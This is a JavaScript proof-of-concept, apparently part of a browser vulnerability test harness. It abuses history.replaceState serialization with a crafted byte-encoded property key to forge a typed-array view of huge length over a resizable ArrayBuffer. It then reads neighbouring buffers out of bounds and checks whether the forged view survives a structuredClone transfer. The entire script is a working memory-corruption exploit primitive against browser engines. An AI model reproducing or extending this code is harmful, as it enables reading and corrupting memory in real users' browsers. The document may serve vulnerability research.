// Check whether the forged view is invalidated when its RAB is transferred.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | (bytes[k + 1] << 8)));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
var phase = "build";
var result;
try {
  var backing = new ArrayBuffer(8, { maxByteLength: 16 });
  new Uint8Array(backing).fill(0x41);
  var filler = new Array(253);
  filler[0] = BigInt(1) << BigInt(40);
  filler[1] = backing;
  for (var i = 2; i < 26; i++) {
    var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(neighbor).fill(0x40 + i);
    filler[i] = neighbor;
  }
  for (var j = 26; j < filler.length; j++) filler[j] = {};
  var shared = { marker: 0x51515151 };
  var input = { filler: filler, first: shared, second: shared };
  input[makeKey()] = 0;
  mark("forged_transfer_ready");
  phase = "store";
  history.replaceState(input, "");
  mark("forged_transfer_stored");
  phase = "load";
  var output = history.state;
  mark("forged_transfer_loaded");
  var target = output.filler[1];
  var synthetic = output["\u0000"];
  var valid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
    synthetic.byteOffset === 8 && synthetic.length > 1e12;
  var neighborBefore = valid ? synthetic[65528] : null;
  var neighborNormal = new Uint8Array(output.filler[2])[0];
  var oldNormal = new Uint8Array(target);
  var moved = null;
  var afterLength = null;
  var afterOffset = null;
  var afterFirst = null;
  var afterNeighbor = null;
  var afterBufferLength = null;
  if (valid && neighborBefore === neighborNormal) {
    phase = "transfer";
    mark("forged_transfer_before");
    moved = structuredClone(target, { transfer: [target] });
    mark("forged_transfer_after");
    phase = "inspect";
    afterLength = synthetic.length;
    afterOffset = synthetic.byteOffset;
    afterFirst = synthetic[0] === undefined ? "undefined" : synthetic[0];
    afterNeighbor = synthetic[65528] === undefined ? "undefined" : synthetic[65528];
    afterBufferLength = synthetic.buffer.byteLength;
  }
  result = { id: "forged_transfer", status: valid && neighborBefore === neighborNormal ? "pass" : "fail", details: {
    view_valid_before: valid,
    neighbor_before: neighborBefore,
    neighbor_normal: neighborNormal,
    old_normal_length: oldNormal.length,
    old_buffer_length: target.byteLength,
    moved_length: moved ? moved.byteLength : null,
    moved_first: moved ? new Uint8Array(moved)[0] : null,
    forged_length_after: afterLength,
    forged_offset_after: afterOffset,
    forged_first_after: afterFirst,
    forged_neighbor_after: afterNeighbor,
    forged_buffer_length_after: afterBufferLength
  } };
} catch (error) {
  result = { id: "forged_transfer", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
try { history.replaceState(null, ""); }
catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
return [result];
